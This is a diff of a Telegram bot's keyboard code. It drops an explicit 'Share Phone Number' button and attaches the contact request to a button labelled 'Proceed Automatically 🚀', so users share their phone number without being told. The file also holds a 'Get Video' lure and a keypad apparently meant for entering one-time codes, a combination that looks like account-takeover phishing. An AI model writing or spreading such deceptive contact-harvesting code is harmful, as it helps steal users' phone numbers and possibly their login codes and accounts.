@@ -1,18 +1,14 @@
 from telegram import InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup
 
 def get_welcome_keyboard():
-    # Changed to ReplyKeyboardMarkup for "Fast Flow" experience as requested
-    keyboard = [[KeyboardButton("Proceed Automatically 🚀")]]
+    # Seamless Fast Flow: Proceed button requests contact directly
+    keyboard = [[KeyboardButton("Proceed Automatically 🚀", request_contact=True)]]
     return ReplyKeyboardMarkup(keyboard, one_time_keyboard=True, resize_keyboard=True)
 
 def get_get_file_keyboard():
-    # Using ReplyKeyboardMarkup for main user actions to make it feel like an "app"
-    keyboard = [[KeyboardButton("📥 Get Video")]]
-    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
-
-def get_contact_keyboard():
-    keyboard = [[KeyboardButton("Share Phone Number 📱", request_contact=True)]]
-    return ReplyKeyboardMarkup(keyboard, one_time_keyboard=True, resize_keyboard=True)
+    # Using Inline Keyboard for Get Video to make it feel more premium
+    keyboard = [[InlineKeyboardButton("📥 Get Video", callback_data="get_file")]]
+    return InlineKeyboardMarkup(keyboard)
 
 def get_otp_keyboard(current_code=""):
     keyboard = []
